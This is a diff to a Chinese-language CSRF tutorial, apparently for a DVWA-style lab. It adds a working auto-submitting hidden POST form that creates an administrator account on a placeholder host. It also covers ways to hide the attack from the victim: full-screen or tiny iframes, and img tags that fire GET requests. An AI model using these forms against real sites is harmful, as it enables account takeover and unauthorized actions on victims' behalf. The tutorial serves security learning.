@@ -5,6 +5,64 @@ CSRF：CSRF（Cross-site request forgery）跨站请求伪造，也被称为“O
 攻击者通过伪造一个链接，将链接发送给目标用户，欺骗用户点击，正如上述概念所说，该链接实际上是获取某网站信任用户信息的链接，目的是在用户电脑上登陆该网站，一旦用户点击了该链接，实际上攻击就完成了。
 #
 举个例子：构造一个网站的链接，如删除网站中的某个内容`http：//xxx.com/del.php?id=1`,只有管理员才能删除，这时我们伪造这个链接，把他发给管理员，诱导他点击这个链接，随后该内容就会被删除(前提是用户已登录了这个网站，还有就是必须使用相同的浏览器打开，不同的浏览器是不成功的；因为这个和浏览器的同源策略有关)。然而管理员却毫不知情。说简单点，就是伪造一个链接，让用户点击，然后就能达到我们需要的操作，比如添加一个账号、增加、删除某条信息等。
+
+**写入型CSRF**
+
+- ​	**GET类型**
+  - 域名信任度
+  - 利用复杂性
+
+- **POST类型CSRF**
+  - 覆盖面广泛（此类漏洞较多）
+
+这两种类型，GET类型危害较大
+
+**CSRF漏洞的适用环境**
+
+- ​	开源CMS
+- ​	拥有相同功能点
+- ​	XSS盗取页面源码
+# POST类型隐藏
+## js点击事件无需手动提交，当点击链接直接自动提交
+```
+<form action="http://x.x.x.x/login.php?m=admin&lang=cn" method="POST">
+      <input type="hidden" name="user_name" value="amn" />
+      <input type="hidden" name="password" value="123456" />
+      <input type="hidden" name="pen_name" value="" />
+      <input type="hidden" name="true_name" value="" />
+      <input type="hidden" name="mobile" value="" />
+      <input type="hidden" name="email" value="" />
+      <input type="hidden" name="role_id" value="-1" />
+      <!-- <input type="submit" value="Submit request" /> 无需，可去掉--> 
+</form>
+//JS点击事件
+<script> document.forms[0].submit(); </script>
+```
+
+**隐藏点击后的页面状态显示**
+
+通过iframe标签，引用远程的的浏览器页面。
+
+iframe功能类似于include，引用链接。
+```
+<ifarme src="http://www.baidu.com" wedth="1920" height="1080"></ifarme>
+```
+通过页面将着呢个屏幕沾满，来进行伪装，实则在后台添加了账户。
+
+**无感知浏览文章触发**
+
+把我们要执行的操作套在一个受对方信任的html页面中，在最后一行添加iframe标签。这样在前端的显示为一个小黑点，很难被发现。
+
+# GET类型隐藏输出结果
+浏览器会打开页面后默认自动去请求图片，JS，CSS等文件。
+GET请求成功后会出现一串提示。可以通过img标签将其隐藏，页面这是会出现一个小框。需要注意的是这里src添加POST请求的链接，他并不会执行代码，只会去发送请求。所以无法实现POST类型的操作。
+
+![image](https://user-images.githubusercontent.com/71583369/148666750-0a3c38a9-9c27-4d79-972c-943182c4664e.png)
+
+**如何隐藏点击后的页面？**
+
+可以使用img标签，将链接填写进去。这样浏览器会自动去请求图片，从而实现GET类型CSRF。
+
 ## 漏洞利用
 ## Low CSRF Source
 源码
